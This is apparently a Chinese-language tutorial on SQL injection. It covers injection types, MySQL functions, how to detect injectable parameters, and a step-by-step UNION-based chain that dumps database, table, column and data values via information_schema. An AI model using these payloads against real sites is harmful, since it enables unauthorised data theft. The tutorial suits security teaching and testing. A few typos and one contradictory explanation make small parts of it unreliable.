# Sql Injection

## 1、什么是Sql注入？

SQL注入是一种代码注入技术，也是最危险的Web应用程序漏洞之一。攻击者在用户输入字段中插入[恶意代码](https://info.support.huawei.com/info-finder/encyclopedia/zh/恶意软件.html)，欺骗数据库执行SQL命令，从而窃取、篡改或破坏各类敏感数据。业界常用Web应用防火墙（WAF）来识别和防御SQL注入攻击，并采取数据加密、执行安全测试、及时更新补丁等方式实现对数据的安全保护。

## 2、SQL注入原理

SQL注入是一种攻击技术，攻击者利用Web应用程序中构建动态SQL查询的漏洞缺陷，在用户输入字段中插入[恶意代码](https://info.support.huawei.com/info-finder/encyclopedia/zh/恶意软件.html)，欺骗数据库执行SQL命令，从而窃取、篡改或破坏各类敏感数据，甚至是在数据库主机上执行危险的系统级命令。由于绝大多数网站和Web应用都需要使用SQL数据库，这使得SQL注入攻击成为了最古老、分布最广的网络攻击类型之一。

*网站登录场景*

例如：当我们访问某个网站时，通常需要填写登录信息。这是一种Web表单，目的是采集特定类型的数据（如账号、密码、验证码等）对照数据库进行检查，如果匹配则授权用户进入，否则用户将被拒绝访问。

但大多数Web表单都无法阻止在表单上输入附加信息，攻击者可以利用该漏洞，在输入参数中构建特殊参数，欺骗数据库执行SQL命令，非法入侵系统。

假设登录页面是通过拼接字符串的方式构造动态SQL语句，然后到数据库中校验用户名和密码是否存在，后台SQL语句是：

```
select * from users where user='&username&' and pass='&password&'
```

若攻击者使用**admin**作为用户名，使用**1' or 'a'='a**作为密码，那么查询就变为：

```
select * from users where user='admin' and pass='1' or 'a'='a'
```

根据运算规则（先算and 再算or），最终结果为True，攻击者成功绕过登录验证环节，入侵后台数据。

## 3、SQL注入类型

| 类型      | 说明                                                                                                                                                             | 常见子类                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 带内SQL注入 | 攻击者使用同一信道发起攻击并收集各种结果。                                                                                                                                          | **报错注入**：攻击者使用特殊函数对数据库发起攻击，根据报错结果获取有关数据库结构方面的信息。**联合注入**：攻击者使用UNION SQL运算符将多个SELECT语句合并为一，获取包含所需数据的单个HTTP响应。                                                                          |
| 推理SQL注入 | 攻击者通过发送有效的负载，观察Web应用的响应，以及数据库服务器的结果行为，推理和重建数据库结构。由于攻击者看不到带内攻击的信息，故又称“SQL盲注”。                                                                                   | **布尔盲注**：攻击者向数据库发送SQL查询，根据页面返回结果（True或False）决定HTTP响应中的内容是要被更改，还是保持不变。**时间盲注**：攻击者向数据库发送SQL查询，根据页面响应时间长短判断返回结果（True或False）从而猜解一些未知的字段。                                                 |
| 带外SQL注入 | 当数据库服务器响应不稳定或无法使用同一信道发起攻击并收集结果时，攻击者通过注入[恶意代码](https://info.support.huawei.com/info-finder/encyclopedia/zh/恶意软件.html)启用数据库上的特定功能，将数据库中的数据发送到由攻击者控制的计算机上，直接窃取数据。 | **DNSlog盲注**：攻击者利用应用的域名访问功能发起[DNS](https://info.support.huawei.com/info-finder/encyclopedia/zh/DNS.html)请求，根据DNSlog中记录的盲注结果提取数据。**HTTP标头注入**：攻击者通过插入额外的HTTP请求头字段，获取真实的HTTP响应，窃取数据库数据。 |

**数据库类型**

*常见的数据库类型，分为关系型数据库和非关系型数据库*

*关系型数据库有 `Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL`等。*

*非关系型数据库有 `Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase`等*

**常用的函数与参数（MySQL）：**

| =、>、>=、<= 、<>        | 比较运算符                                                        |
| -------------------- | ------------------------------------------------------------ |
| and、or               | 逻辑运算符                                                        |
| version( )           | mysql数据库版本                                                   |
| database( )          | 当前数据库名                                                       |
| sleep( )             | 睡眠时间为指定的秒数                                                   |
| if(true,t,f)         | if判断                                                         |
| length( )            | 返回字符串的长度                                                     |
| substring( )         | 截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度 |
| substr( )            |                                                              |
| mid( )               |                                                              |
| left( )              | 从左侧开始取指定字符个数的字符串                                             |
| concat( )            | 没有分隔符的连接字符串                                                  |
| concat_ws ( )        | 含有分割符的连接字符串                                                  |
| group_conat( )       | 连接一个组的字符串                                                    |
| ord( )               | 返回ASCII码                                                     |
| ascii( )             |                                                              |
| hex( )               | 将字符串转换为十六进制                                                  |
| unhex( )             | hex的反向操作                                                     |
| md5( )               | 返回MD5值                                                       |
| floor(x)             | 返回不大于x的最大整数                                                  |
| round ( )            | 返回参数x接近的整数                                                   |
| rand( )              | 返回0-1之间的随机浮点数                                                |
| load_file( )         | 读取文件，并返回文件内容作为一个字符串                                          |
| find_in_set( )       | 返回字符串在字符串列表中的位置                                              |
| benchmark( )         | 指定语句执行的次数                                                    |
| name_const ( )       | 返回表作为结果                                                      |
| user( )              | 用户名                                                          |
| current_user( )      | 当前用户名                                                        |
| system_ user( )      | 系统用户名                                                        |
| @@datadir            | 数据库路径                                                        |
| @@versoin_compile_os | 操作系统版本                                                       |

## 4、判断注入点

### 4.1 url判断

通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：http://xxx.xxx.xxx/abcd.php?id=XX对 Sql 注入的判断，主要有两个方面：

判断该带参数的 Url 是否存在 Sql 注入？
如果存在 Sql 注入，那么属于哪种 Sql 注入？
可能存在 Sql 注入攻击的 ASP/PHP/JSP 动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数。有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的 动态网页且此网页访问了数据库，那么就有可能存在 Sql 注入。如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大。

### 4.2 注入点

测试注入点：

1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入

注入点判断：`id=1'（常见）`id=1" id=1') id=1')) id=1") id=1"))

*在参数后面加上单引号,比如: http://xxx/abc.php?id=1' 如果页面返回错误，则存在 Sql 注入。
原因是无论字符型还是整型都会因为单引号个数不匹配而报错。
（如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）*

2.通过构造get、post、cookie请求再相应的http头信息等查找敏感信息

3.通过构造一些语句，检测服务器中响应的异常

## 5、注入类型

### 5.1通常sql注入有两种类型

> 1.数字型
> 
> 2.字符型

（其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。）

### 5.2 数字型判断

当url中输入的参数为数字时，如：http://www.xxx.com/?id?=1时，可以使用

> and 1=1 或 and 1=2

输入参数时，数据库中执行的语句为：

> select * from 表名 where id=1 

输入and 1=1 后，url：http://www.xxx.com/?id?=1 and 1=1  查询语句变为

> select * from 表名 where id=1 and 1=1  正常显示

当输入and 1=2 后,url：http://www.xxx.com/?id?=1 and 1=2 

> select * from 表名 where id=1 and 1=2   前真后假，不正确，页面显示错误

加单引号，URL：http://www.xxx.com/?id?=1‘；对应的sql：

>  select * from table where id=1'    这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；

由此判断数字型注入

### 5.3 字符型注入判断

当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：

> select * from <表名> where id = 'x'

（1） 加单引号：select * from table where name='admin''；

由于加单引号后变成三个单引号，则无法执行，程序会报错；

（2） 加 ' and 1=1 此时sql 语句为：select * from table where name='admin' and 1=1' ，也无法进行注入，还需要通过注释符号将其绕过；

因此，构造语句为：select * from table where name ='admin' and 1=--' 可成功执行返回结果正确；

（3） 加and 1=2— 此时sql语句为：select * from table where name='admin' and 1=2–'则会报错；

如果满足以上三点，可以判断该url为字符型注入。

同时，这种类型我们可以使用 and ‘1’='1 和 and ‘1’='2来判断：

Url 地址中输入 http://xxx/abc.php?id= x' and '1'='1 页面运行正常，继续进行下一步。
Url 地址中继续输入 http://xxx/abc.php?id= x' and '1'='2 页面运行错误，则说明此 Sql 注入为字符型注入。

**原因如下：**

当输入 and ‘1’='1时，后台执行 Sql 语句：

> select * from <表名> where id = 'x' and '1'='1'语法正确，逻辑判断正确，所以返回正确。

当输入 and ‘1’='2时，后台执行 Sql 语句：

> select * from <表名> where id = 'x' and '1'='2'语法正确，但逻辑判断错误，所以返回正确。

## 6、开始注入

### 6.1 判断列数：

?id=1' order by 4# 报错

?id=1' order by 3# 没有报错，说明存在3列

### 6.2爆出数据库：

?id=-1' union select 1,database(),3--+

?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata#

### 6.3 爆出数据表：

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库'#

### 6.4 爆出字段：

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表'#

### 6.5爆出数据值：

?id=-1' union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+

### 6.7 拓展一些其他函数：

system_user() 系统用户名

user() 用户名

current_user 当前用户名

session_user()连接数据库的用户名

database() 数据库名

version() MYSQL数据库版本

load_file() MYSQL读取本地文件的函数

@@datadir 读取数据库路径

@@basedir MYSQL 安装路径

@@version_compile_os 操作系统

多条数据显示函数：

concat()、group_concat()、concat_ws()

*** 此处语句知识简单的演示，具体情况视网站情况而定***

参考文章：

https://info.support.huawei.com/info-finder/encyclopedia/zh/SQL%E6%B3%A8%E5%85%A5.html

https://blog.csdn.net/qq_44275213/article/details/118892912

https://blog.csdn.net/ytdd66/article/details/138499869